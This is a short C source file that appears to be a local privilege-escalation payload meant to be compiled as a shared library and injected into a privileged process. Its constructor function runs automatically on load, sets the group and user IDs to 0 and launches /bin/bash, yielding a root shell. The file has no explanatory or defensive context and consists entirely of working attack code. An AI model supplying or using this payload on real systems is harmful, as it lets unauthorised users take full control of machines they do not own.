#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
static void __attribute__ ((constructor)) _init(void);

static void
_init(void)
{
        setgid(0);
        setuid(0);
        char *argstoexecve[] = { "bash", NULL };
        execv("/bin/bash", argstoexecve);
}
